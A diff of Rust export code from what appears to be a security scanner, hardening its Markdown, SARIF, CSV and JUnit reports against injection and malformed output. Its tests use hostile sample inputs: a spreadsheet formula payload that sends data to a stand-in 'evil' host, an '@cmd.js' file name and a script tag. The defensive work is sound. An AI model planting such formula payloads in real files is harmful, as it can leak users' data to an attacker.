@@ -12,12 +12,12 @@ pub fn risk_score_to_level(score: u8) -> &'static str {
 /// Return (css_class, label) for risk badge rendering.
 /// Levels: safe → green, warning → yellow/amber, danger → red.
 pub fn render_risk_badge(score: u8) -> (String, String) {
-    match score {
-        0..=29 => (
+    match risk_score_to_level(score) {
+        "safe" => (
             "bg-green-600 text-white".into(),
             format!("SAFE ({})", score),
         ),
-        30..=69 => (
+        "warning" => (
             "bg-yellow-500 text-black".into(),
             format!("WARNING ({})", score),
         ),
@@ -227,18 +227,15 @@ pub fn export_markdown(result: &ScanResult) -> String {
         sorted.sort_by_key(|m| severity_sort_key(&m.severity));
 
         for (i, m) in sorted.iter().enumerate() {
-            let ctx_escaped = m.context.replace('|', "\\|");
-            let ctx_trunc: String = ctx_escaped.chars().take(120).collect();
-            let ctx_safe = ctx_trunc.replace('\n', " ");
-
+            let ctx: String = m.context.chars().take(120).collect();
             md.push_str(&format!(
                 "| {} | {} | {} | {} | {} | {} |\n",
                 i + 1,
-                m.severity,
-                m.matched_pattern,
-                m.file_path,
+                md_cell(&m.severity),
+                md_cell(&m.matched_pattern),
+                md_cell(&m.file_path),
                 m.line_number,
-                ctx_safe,
+                md_cell(&ctx),
             ));
         }
         md.push('\n');
@@ -497,8 +494,9 @@ fn markdown_ttp(md: &mut String, result: &ScanResult) {
     }
 }
 
+/// A Markdown table cell: `|` ends the cell, a newline ends the row.
 fn md_cell(value: &str) -> String {
-    value.replace('|', "\\|").replace('\n', " ")
+    value.replace('|', "\\|").replace(['\n', '\r'], " ")
 }
 
 // ── SARIF export ──────────────────────────────────────────────────────────
@@ -526,20 +524,31 @@ pub fn export_sarif(result: &ScanResult) -> String {
 
     let mut results: Vec<serde_json::Value> = Vec::new();
     for (m, id) in sorted.iter().zip(&ids) {
-        results.push(serde_json::json!({
+        // History hits are `<commit>:<path>`: the path is the location, the
+        // commit a property. `0a1b…:a.js` is not a URI and uploads failed.
+        let path = crate::git_history::tree_path(&m.file_path);
+        let commit = m
+            .file_path
+            .strip_suffix(path)
+            .and_then(|c| c.strip_suffix(':'));
+        let mut entry = serde_json::json!({
             "ruleId": rule_id(&m.matched_pattern),
             "ruleIndex": rule_indices.get(&m.matched_pattern).copied().unwrap_or(0),
             "level": sarif_level(&m.severity),
             "message": { "text": format!("{} detected in {}", m.matched_pattern, m.file_path) },
             "locations": [{
                 "physicalLocation": {
-                    "artifactLocation": { "uri": m.file_path.replace('\\', "/") },
+                    "artifactLocation": { "uri": uri_path(path) },
                     "region": { "startLine": m.line_number }
                 }
             }],
             // v2: line numbers no longer part of the id (see baseline.rs).
             "partialFingerprints": { "kalascan/v2": id },
-        }));
+        });
+        if let Some(commit) = commit {
+            entry["properties"] = serde_json::json!({ "commit": commit });
+        }
+        results.push(entry);
     }
 
     serde_json::to_string_pretty(&serde_json::json!({
@@ -1395,11 +1404,20 @@ pub fn export_csv(result: &ScanResult) -> String {
     out
 }
 
+/// Quoting alone is not enough: a cell starting with `=`, `+`, `-` or `@`
+/// is a formula in Excel and LibreOffice even inside quotes, and the context
+/// column is text from the scanned (attacker-written) code. A leading `'`
+/// makes it plain text (OWASP CSV injection).
 fn csv_field(value: &str) -> String {
+    let value = if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{}", value)
+    } else {
+        value.to_string()
+    };
     if value.chars().any(|c| matches!(c, ',' | '"' | '\n' | '\r')) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
-        value.to_string()
+        value
     }
 }
 
@@ -1439,8 +1457,15 @@ pub fn export_junit(result: &ScanResult) -> String {
     out
 }
 
+/// XML 1.0 forbids most control characters outright; one ESC from a
+/// colourised dropper script made the whole JUnit report unparseable.
 fn escape_xml(s: &str) -> String {
-    s.replace('&', "&amp;")
+    s.chars()
+        .filter(|&c| {
+            matches!(c, '\t' | '\n' | '\r') || (c >= ' ' && c != '\u{FFFE}' && c != '\u{FFFF}')
+        })
+        .collect::<String>()
+        .replace('&', "&amp;")
         .replace('<', "&lt;")
         .replace('>', "&gt;")
         .replace('"', "&quot;")
@@ -1482,6 +1507,20 @@ fn gh_escape_data(s: &str) -> String {
 
 fn gh_escape_prop(s: &str) -> String {
     gh_escape_data(s).replace(':', "%3A").replace(',', "%2C")
+}
+
+/// A relative path as a URI reference: SARIF consumers reject raw spaces,
+/// `#` and `%` in `artifactLocation.uri`.
+fn uri_path(path: &str) -> String {
+    let mut out = String::with_capacity(path.len());
+    for b in path.replace('\\', "/").bytes() {
+        if b.is_ascii_alphanumeric() || b"-._~/".contains(&b) {
+            out.push(b as char);
+        } else {
+            out.push_str(&format!("%{:02X}", b));
+        }
+    }
+    out
 }
 
 fn escape_html(s: &str) -> String {
@@ -2008,6 +2047,21 @@ mod tests {
     }
 
     #[test]
+    fn sarif_locations_are_uris_and_history_commit_is_a_property() {
+        let mut r = sample_result();
+        let commit = "031a028c1f4e2b7d9a0c3e5f7a9b1d3f5e7a9c1b";
+        r.rule_matches[0].file_path = format!("{}:src/old file#1.js", commit);
+        r.rule_matches.truncate(1);
+        let parsed: serde_json::Value = serde_json::from_str(&export_sarif(&r)).unwrap();
+        let result = &parsed["runs"][0]["results"][0];
+        assert_eq!(
+            result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
+            "src/old%20file%231.js"
+        );
+        assert_eq!(result["properties"]["commit"], commit);
+    }
+
+    #[test]
     fn sarif_severity_maps_to_level() {
         assert_eq!(sarif_level("critical"), "error");
         assert_eq!(sarif_level("medium"), "warning");
@@ -2024,6 +2078,30 @@ mod tests {
     }
 
     #[test]
+    fn csv_cells_never_start_a_formula() {
+        let mut r = sample_result();
+        r.rule_matches[0].context = "=HYPERLINK(\"http://evil/?\"&A1)".into();
+        r.rule_matches[0].file_path = "@cmd.js".into();
+        let csv = export_csv(&r);
+        assert!(
+            csv.contains("\"'=HYPERLINK(\"\"http://evil/?\"\"&A1)\""),
+            "{}",
+            csv
+        );
+        assert!(csv.contains(",'@cmd.js,"));
+    }
+
+    #[test]
+    fn markdown_cells_escape_pipes_everywhere() {
+        let mut r = sample_result();
+        r.rule_matches[0].file_path = "src/a|b.js".into();
+        r.rule_matches[0].context = "x | y\nz".into();
+        let md = export_markdown(&r);
+        assert!(md.contains("src/a\\|b.js"));
+        assert!(md.contains("x \\| y z"));
+    }
+
+    #[test]
     fn junit_counts_findings_as_failures() {
         let mut r = sample_result();
         r.rule_matches[0].context = "<script>alert(1)</script>".into();
@@ -2031,6 +2109,11 @@ mod tests {
         assert!(xml.contains("<testsuite name=\"kalascan\""));
         assert!(xml.contains(&format!("tests=\"{}\"", r.rule_matches.len())));
         assert!(xml.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
+        // ESC and form feed are illegal in XML 1.0 and must not reach the file.
+        r.rule_matches[0].context = "echo \u{1b}[31mred\u{0c}".into();
+        let xml = export_junit(&r);
+        assert!(xml.contains("echo [31mred"));
+        assert!(!xml.contains('\u{1b}') && !xml.contains('\u{0c}'));
     }
 
     #[test]
